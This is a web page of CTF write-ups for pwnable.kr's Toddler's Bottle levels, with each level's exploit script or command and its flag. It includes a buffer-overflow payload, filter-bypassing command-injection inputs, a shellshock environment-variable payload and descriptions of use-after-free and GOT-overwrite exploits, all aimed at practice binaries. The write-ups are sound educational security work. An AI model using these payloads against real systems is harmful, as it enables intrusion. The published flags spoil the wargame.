<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=c4fe2f8b85b5cd33f4a88c9b430b87ece1dd468c">
    
<link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">

<!-- remove the cache headers -->
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Toddlers_bottle Writeups | Avishai’s CTF Writeups</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Toddlers_bottle Writeups" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="…" />
<meta property="og:description" content="…" />
<link rel="canonical" href="http://localhost:4000/CTF_writeups/pwnable.kr/Toddlers_Bottle/" />
<meta property="og:url" content="http://localhost:4000/CTF_writeups/pwnable.kr/Toddlers_Bottle/" />
<meta property="og:site_name" content="Avishai’s CTF Writeups" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Toddlers_bottle Writeups" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"Toddlers_bottle Writeups","url":"http://localhost:4000/CTF_writeups/pwnable.kr/Toddlers_Bottle/"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/CTF_writeups/">
          <h1>Avishai's CTF Writeups</h1>
        </a>
        <h2>...</h2>

        <section id="downloads">
          
          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <p><a href="/CTF_writeups/pwnable.kr/" style="display:inline-block; margin-bottom: 1rem; text-decoration: none; color: #16a085; font-weight: bold;">
      ← Back to pwnable.kr
    </a></p>

<p>##s for the <a href="http://pwnable.kr/Toddlers_Bottle/">Toddlers_bottle</a> wargame from Pwnable.kr.</p>

<style>
  body {
    font-family: 'Arial', sans-serif;
    background-color: #eceff1;
    color: #333;
    margin: 0;
  }
  #main {
    max-width: 100% !important;
    width: 100% !important;
    margin: 0 auto;
  }
  .Toddlers_Bottle-container {
    display: flex;
    gap: 1.5rem;
    margin-top: 2rem;
    padding: 1rem;
  }
  .Toddlers_Bottle-sidebar {
    min-width: 200px;
    max-height: 90vh;
    overflow-y: auto;
    position: sticky;
    top: 1rem;
    padding: 1.5rem;
    border-radius: 8px;
    background-color: #34495e;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    color: #ecf0f1;
    margin-top: 1rem;
  }
  .Toddlers_Bottle-sidebar h00 {
    font-size: 1.2rem;
    font-weight: 600;
    margin-bottom: 1.5rem;
    color: #ecf0f1;
    border-bottom: 2px solid #16a085;
    padding-bottom: 0.5rem;
  }
  .Toddlers_Bottle-sidebar ul {
    list-style: none;
    padding-left: 0;
    font-size: 1rem;
    margin: 0;
  }
  .Toddlers_Bottle-sidebar li {
    margin-bottom: 0.5rem;
  }
  .Toddlers_Bottle-sidebar a {
    display: block;
    padding: 6px 12px;
    border-radius: 6px;
    text-decoration: none;
    color: #ecf0f1;
    transition: background 0.3s ease, color 0.3s ease;
  }
  .Toddlers_Bottle-sidebar a:hover {
    background-color: #16a085;
    color: #fff;
  }
  .Toddlers_Bottle-content {
    flex: 1;
    max-height: 90vh;
    overflow-y: auto;
    padding-right: 1rem;
    background-color: #ffffff;
    border-radius: 8px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
    padding: 2rem;
    font-size: 1rem;
    color: #333;
    margin-top: 1rem;
  }
  .Toddlers_Bottle-content h00 {
    font-size: 1.4rem;
    font-weight: 600;
    margin-top: 2rem;
    color:rgb(143, 151, 159);
    scroll-margin-top: 100px;
  }
  hr {
    margin: 2.5rem 0;
    border: none;
    border-top: 1px solid #ddd;
  }
  .Toddlers_Bottle-sidebar::-webkit-scrollbar {
    width: 8px;
  }
  .Toddlers_Bottle-sidebar::-webkit-scrollbar-thumb {
    background-color: #16a085;
    border-radius: 4px;
  }
  .Toddlers_Bottle-sidebar::-webkit-scrollbar-track {
    background-color: #ecf0f1;
  }
  @media (max-width: 768px) {
    .Toddlers_Bottle-container {
      flex-direction: column;
    }
    .Toddlers_Bottle-sidebar {
      max-height: none;
      width: 100%;
      margin-bottom: 2rem;
    }
  }
  .level-banner {
    background-color: #16a085;
    color: #fff;
    padding: 1rem;
    text-align: center;
    font-weight: bold;
    margin-top: 2rem;
    border-radius: 8px;
  }
</style>

<div class="Toddlers_Bottle-container">

  <!-- Sidebar -->
  <div class="Toddlers_Bottle-sidebar">
    <h00>Levels</h00>
    <ul>
      
      
      
        
        
          <li><a href="#blackjack">blackjack</a></li>
        
      
        
        
          <li><a href="#blukat">blukat</a></li>
        
      
        
        
          <li><a href="#bof">bof</a></li>
        
      
        
        
          <li><a href="#cmd1">cmd1</a></li>
        
      
        
        
          <li><a href="#cmd2">cmd2</a></li>
        
      
        
        
          <li><a href="#coin">coin</a></li>
        
      
        
        
          <li><a href="#collision">collision</a></li>
        
      
        
        
          <li><a href="#fd">fd</a></li>
        
      
        
        
          <li><a href="#flag">flag</a></li>
        
      
        
        
      
        
        
          <li><a href="#lotto">lotto</a></li>
        
      
        
        
          <li><a href="#mistake">mistake</a></li>
        
      
        
        
          <li><a href="#passcode">passcode</a></li>
        
      
        
        
          <li><a href="#random">random</a></li>
        
      
        
        
          <li><a href="#shellshock">shellshock</a></li>
        
      
        
        
          <li><a href="#uaf">uaf</a></li>
        
      
        
        
          <li><a href="#unlink">unlink</a></li>
        
      
    </ul>
  </div>

  <!-- Main content -->
  <div class="Toddlers_Bottle-content">
    
      
      
        <h00 id="blackjack">blackjack</h00>
        <p>in this challenge, it checks if the bet is bigger than the cash. however, i can give it negative number, it will pass the check, and when i’ll loose it will do so: cash = cash - bet, which give me a lot of money.</p>

<p>for example, i gave <code class="language-plaintext highlighter-rouge">-100000000000</code></p>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/blackjack.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">YaY_I_AM_A_MILLIONARE_LOL</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="blukat">blukat</h00>
        <p>i saw that it doesn’t check whether it can open the file. When it fails, it submit this string to password: <code class="language-plaintext highlighter-rouge">cat: password: Permission denied</code> (with \n)
Let’s try give this as password.
It works!</p>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/blukat.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">Pl3as_DonT_Miss_youR_GrouP_Perm!!</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="bof">bof</h00>
        <p>this is simple buffer overflow, notice it takes us 52 bytes till we reach the arguments pass to the function, which is where 0xdeadbeef is stored.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3 
</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="k">def</span> <span class="nf">p32</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="n">key</span> <span class="o">=</span> <span class="mh">0xcafebabe</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">52</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span>

<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

</code></pre></div></div>
<p>and run this line <code class="language-plaintext highlighter-rouge">(./bof.py ;cat) | nc pwnable.kr 9000</code></p>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/bof.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">daddy, I just pwned a buFFer :)</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="cmd1">cmd1</h00>
        <p>here we need to read the flag, but can’t use some strings, as <code class="language-plaintext highlighter-rouge">sh</code> <code class="language-plaintext highlighter-rouge">flag</code> and <code class="language-plaintext highlighter-rouge">tmp</code></p>

<p>so, first we’ll enter our tempdir, then create link to flag <code class="language-plaintext highlighter-rouge">ln -sf ~/flag pass</code>, and lastly execute the cmd1: <code class="language-plaintext highlighter-rouge">~/cmd1 "/bin/cat pass"</code></p>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/cmd1.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">mommy now I get what PATH environment is for :)</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="cmd2">cmd2</h00>
        <p>this is more complicated level.
here we use this input:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./cmd2 "cd ..; cd ..; pwd; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)fl*"
</code></pre></div></div>

<p>first, we cd into <code class="language-plaintext highlighter-rouge">/</code>.
then, we execute this command: <code class="language-plaintext highlighter-rouge">/bin/cat /home/cmd2/fl*</code>, by taking each time our current directory with <code class="language-plaintext highlighter-rouge">pwd</code>, which gives us <code class="language-plaintext highlighter-rouge">/</code>.</p>

<p>by this way we can build our command.</p>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/cmd2.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FuN_w1th_5h3ll_v4riabl3s_haha</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="coin">coin</h00>
        <p>in this challenge we need to do binary search, multiple times, until we answer to all of the questions.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">left</span><span class="p">,</span> <span class="n">right</span><span class="p">):</span>
    <span class="n">payload</span><span class="o">=</span>  <span class="s">" "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="n">left</span><span class="p">,</span><span class="n">right</span><span class="p">)))</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">answer</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="k">if</span> <span class="s">"Correct"</span> <span class="ow">in</span> <span class="n">answer</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"coin is {}</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>

    <span class="n">answer_int</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
    <span class="c1"># if answer_int==9:
</span>    <span class="c1">#     # p.send(payload)
</span>    <span class="k">return</span> <span class="n">answer_int</span><span class="o">/</span><span class="mi">10</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">right</span><span class="o">-</span><span class="n">left</span><span class="p">)</span>    

<span class="c1"># Connection details
# host = 'pwnable.kr'
</span><span class="n">host</span> <span class="o">=</span> <span class="s">'localhost'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9007</span>

<span class="c1"># context.log_level = 'debug'
</span>
<span class="c1"># Establish a remote connection
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="c1"># p.recvuntil('- Ready? starting in 3 sec... -')
# p.recv() # get all begin data
</span>
<span class="c1"># line = p.recv() # N=734 C=10
</span>
<span class="c1"># # Regular expression to extract N and C values
# match = re.search(r'N=(\d+)\s+C=(\d+)', line.decode())
</span>
<span class="c1"># if not match:
#     print("Could not extract N and C values from the received data.")
#     exit(1)
</span>
<span class="c1"># N = int(match.group(1))  # Extract the first group (N)
# C = int(match.group(2))  # Extract the second group (C)
# # print(f"N={N}, C={C}")
# print("N={0}, C={1}".format(N,C))
</span>
<span class="c1"># low = 0
# big = N
# binary search algorithm
</span>
<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span> <span class="c1"># get all begin data
# p.recv()
</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span> <span class="c1"># N=734 C=10
</span>    
    <span class="k">if</span> <span class="s">"flag"</span> <span class="ow">in</span> <span class="n">line</span><span class="p">.</span><span class="n">decode</span><span class="p">():</span>
        <span class="k">print</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
        <span class="k">break</span>

    <span class="c1"># Regular expression to extract N and C values
</span>    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'N=(\d+)\s+C=(\d+)'</span><span class="p">,</span> <span class="n">line</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Could not extract N and C values from the received data."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>  <span class="c1"># Extract the first group (N)
</span>    <span class="n">C</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>  <span class="c1"># Extract the second group (C)
</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"N={0}, C={1}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">C</span><span class="p">))</span>
    <span class="n">left</span><span class="p">,</span> <span class="n">right</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">N</span> <span class="o">-</span> <span class="mi">1</span>  <span class="c1"># Initialize the search bounds
</span>    
    <span class="k">while</span> <span class="n">left</span> <span class="o">&lt;=</span> <span class="n">right</span><span class="p">:</span>
        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>  <span class="c1"># Find the midpoint
</span>        <span class="n">res</span> <span class="o">=</span> <span class="n">check</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">left</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">res</span><span class="o">==-</span><span class="mi">1</span><span class="p">:</span> <span class="c1"># Found first coin
</span>            <span class="k">break</span> 
        <span class="k">elif</span> <span class="n">res</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span> <span class="c1"># Target in in left half
</span>            <span class="n">right</span> <span class="o">=</span> <span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span> <span class="c1"># Target in right half
</span>            <span class="n">left</span> <span class="o">=</span> <span class="n">mid</span>



<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="c1"># p.sendline('15')
# p.recv()
# p.sendline('92')
</span>
<span class="c1">#  p.log("send values")
</span>

</code></pre></div></div>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/coin.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">b1NaRy_S34rch1nG_1s_3asy_p3asy</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="collision">collision</h00>
        <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3 
</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="k">def</span> <span class="nf">p32</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="n">hashcode</span> <span class="o">=</span> <span class="mh">0x21DD09EC</span>

<span class="n">junk</span> <span class="o">=</span> <span class="mh">0x01010101</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">hashcode</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">junk</span><span class="p">)</span>

<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

</code></pre></div></div>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/collision.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">daddy! I just managed to create a hash collision :)</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="fd">fd</h00>
        <p>in this challenge the file-descriptor will be our input minus 0x1234.
so, let’s give it 0x1234+1 = 4661, and this will make the file-descriptor to be 1, which is stdin.
Then, we will give the desired input <code class="language-plaintext highlighter-rouge">LETMEWIN</code> and that’s it.</p>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/fd.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">mommy! I think I know what a file descriptor is!!</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="flag">flag</h00>
        <p>first i used strings on the file, and found it compressed with UPX32.
then, i decompressed it using upx, <code class="language-plaintext highlighter-rouge">upx -d flag</code>.
lastly, i debugged the program using radare2 and viewed the flag.</p>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/flag.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">UPX...? sounds like a delivery service :)</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
    
      
      
        <h00 id="lotto">lotto</h00>
        <p>in this challenge the lotto process isn’t so good, it uses double for-loop and this reduce our brute force to only 45 options.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="n">include_relative</span> <span class="n">scripts</span><span class="o">/</span><span class="n">lotto</span><span class="o">/</span><span class="n">lotto</span><span class="p">.</span><span class="n">py</span> <span class="o">%</span><span class="p">}</span>
</code></pre></div></div>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/lotto.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">sorry mom... I FORGOT to check duplicate numbers... :(</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="mistake">mistake</h00>
        <p>in this challenge the error lies in the fact it reads the password from stdin, because the compare happens before the assignment when it opens the password file for reading.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="n">include_relative</span> <span class="n">scripts</span><span class="o">/</span><span class="n">mistake</span><span class="o">/</span><span class="n">mistake</span><span class="p">.</span><span class="n">py</span> <span class="o">%</span><span class="p">}</span>
</code></pre></div></div>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/mistake.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">Mommy, the operator priority always confuses me :(</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="passcode">passcode</h00>
        <p>in this level we exploit the fact we can fill the stack with our data, then we can change the address of <code class="language-plaintext highlighter-rouge">passcode1</code>.
so, we choose what will be the memory in this place, and also what will be the content.</p>

<p>in this case, i chose the put the memory of the <code class="language-plaintext highlighter-rouge">exit_plt</code>, and override it with the memory where we print the flag 
<img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/passcode_1.png" alt="image" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="n">include_relative</span> <span class="n">scripts</span><span class="o">/</span><span class="n">passcode</span><span class="o">/</span><span class="n">passcode</span><span class="p">.</span><span class="n">py</span> <span class="o">%</span><span class="p">}</span>
</code></pre></div></div>
<p>you might need to adjust the addresses.</p>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/passcode_2.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">Sorry mom.. I got confused about scanf usage :(</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="random">random</h00>
        <p>here is using rand(), without setting the seed using srand().
so, it means it uses the default seed and this will always give the same sequence.
as you can see, it always give the same value, <code class="language-plaintext highlighter-rouge">0x6b8b4567</code>
<img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/random_1.png" alt="image" /></p>

<p>now, we need to give in int this value: 0xdeadbeef ^ 0x6b8b4567, which gives us <code class="language-plaintext highlighter-rouge">3039230856</code></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">Mommy, I thought libc random is unpredictable...</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="shellshock">shellshock</h00>
        <p>in this level we exploit the bug of shellshock, which runs unintentionally code that is found after func declaration inside env variables.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export env_var='() { echo "regular stuff"; }; cat flag'
</code></pre></div></div>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/shellshock.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">only if I knew CVE-2014-6271 ten years ago..!!</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="uaf">uaf</h00>
        <p>here we exploit the fact we delete Man and Woman, and manage to put our code inside the grave of Man and Woman.
Then, when we’ll call it’s introduce function, it will execute shell.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="n">include_relative</span> <span class="n">scripts</span><span class="o">/</span><span class="n">uaf</span><span class="o">/</span><span class="n">payload</span><span class="p">.</span><span class="n">py</span> <span class="o">%</span><span class="p">}</span>
</code></pre></div></div>

<p>we will give as input this values:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3 (for free)
2 (for put our payload once)
2 (for put our payload twice)
1 (for calling "introduce")
</code></pre></div></div>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/uaf.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">yay_f1ag_aft3r_pwning</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
      
      
        <h00 id="unlink">unlink</h00>
        <p>in this challenge we used the way it return from the main, and build the payload.</p>

<p>we inject in the stack, where ecx will get the address from. then, we make sure that we put the shell function address in [ecx-4].</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="n">include_relative</span> <span class="n">scripts</span><span class="o">/</span><span class="n">unlink</span><span class="o">/</span><span class="n">unlink</span><span class="p">.</span><span class="n">py</span> <span class="o">%</span><span class="p">}</span>
</code></pre></div></div>

<p><img src="/CTF_writeups/pwnable.kr/Toddlers_Bottle/images/unlink.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">conditional_write_what_where_from_unl1nk_explo1t</code></em></strong></p>

        <div class="level-banner">Next Level Writeup</div>
        <hr />
      
    
  </div>

</div>

      </section>
    </div>
  </body>
</html>
